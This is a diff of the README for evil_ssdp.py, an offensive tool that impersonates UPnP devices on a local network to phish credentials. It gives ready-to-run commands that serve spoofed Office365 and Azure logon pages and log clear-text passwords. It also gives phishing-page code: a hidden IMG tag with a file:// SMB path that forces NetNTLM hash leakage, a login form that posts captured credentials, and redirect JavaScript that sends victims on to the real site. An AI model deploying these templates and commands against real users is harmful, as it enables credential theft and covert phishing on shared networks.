@@ -24,17 +24,21 @@ The tool will automatically update an IMG tag in the phishing page using the IP 
 Some example scenarios:
 
 ```
-# Use wlan0 for device advertisement and phishing, capturing NetNTLM and asking for clear-text
-# via a spoofed Office365 logon form. Redirect to Microsoft aftering capturing credentials:
+# Use wlan0 for device advertisement and phishing, capturing NetNTLM and
+# asking for clear-text via a spoofed Office365 logon form. Redirect to
+# Microsoft aftering capturing credentials:
 evil_ssdp.py wlan0 -t office365 -u 'https://office.microsoft.com'
 
 # Same as above, but assuming your SMB server is running on another IP:
-evil_ssdp.py wlan0 -t office365 -u 'https://office.microsoft.com' -s 192.168.1.205
+evil_ssdp.py wlan0 -t office365 -u 'https://office.microsoft.com' \
+    -s 192.168.1.205
 
 # Prompt for creds using basic auth and redirect to Azure:
-evil_ssdp.py wlan0 -t microsoft-azure -u 'https://azure.microsoft.com/auth/signin/' -b
+evil_ssdp.py wlan0 -t microsoft-azure -u \
+    'https://azure.microsoft.com/auth/signin/' -b
 
-# Hope for an XXE vul to capture NetNTLM while Impacket/Responder is running on wlan0:
+# Hope for an XXE vul to capture NetNTLM while Impacket/Responder is running
+on wlan0:
 evil_ssdp.py wlan0 -t xxe-smb
 ```
 
@@ -58,7 +62,7 @@ optional arguments:
   -s SMB, --smb SMB     IP address of your SMB server. Defalts to the primary
                         address of the "interface" provided.
   -b, --basic           Enable base64 authentication for templates and write
-                        credentials to creds.txt
+                        credentials to log file.
   -r REALM, --realm REALM
                         Realm when prompting target for authentication via
                         Basic Auth.
@@ -66,6 +70,9 @@ optional arguments:
                         POST for logon forms and with templates that include
                         the custom redirect JavaScript (see README for more
                         info).[example: -r https://google.com]
+  -a, --analyze         Run in analyze mode. Will NOT respond to any SSDP
+                        queries, but will still enable and run the web server
+                        for testing.
 ```
 
 # Templates
@@ -86,12 +93,14 @@ Creating your own templates is easy. Simply copy the folder of an existing templ
 In your phishing page (`present.html`), use variables like the following for additional functionality:
 
 ```
-# The following line will initiate a NetNTLM challenge/response using the IP address of either the interface
-# you provide or an optionally specified IP address:
+# The following line will initiate a NetNTLM challenge/response using the IP
+# address of either the interface you provide or an optionally specified IP
+# address:
 <img src="file://///$smb_server/smb/hash.jpg" style="display: none;" />
 
-# The following will leverage optionally specified URL redirection. This is handy when used with
-# basic authentication to redirect to a valid site. This line is built in to the microsoft-azure template:
+# The following will leverage optionally specified URL redirection. This is
+# handy when used with basic authentication to redirect to a valid site. This
+# line is built in to the microsoft-azure template:
     <script>
 	    var url = "$redirectUrl";
     	    if (url != "") {
@@ -100,10 +109,11 @@ In your phishing page (`present.html`), use variables like the following for add
     </script>
 
 
-# If using an HTTP form to capture clear-text credentials, use code like the following. Also any template doing a
-# POST request will automatically support the '-u' parameter to redirect after the POST completes.  The tool will
-# monitor POSTs to this URL for credentials:
-<form method="POST" action="/ssdp/do_login.html" name="LoginForm" autocomplete="off">
+# If using an HTTP form to capture clear-text credentials, use code like the
+# following. Also any template doing a POST request will automatically
+# support the '-u' parameter to redirect after the POST completes.  The tool
+# will monitor POSTs to this URL for credentials:
+<form method="POST" action="/ssdp/do_login.html" name="LoginForm">
 ```
 
 The tool currently only correctly creates devices for the UPNP 'Basic' device type, although it is responding to the SSDP queries for all devices types. If you know UPNP well, you can create a new template with the correct parameters to fufill requests for other device types as well. There is still a lot to explore here with exploiting specific applications and the way they expect and leverage UPNP devices.
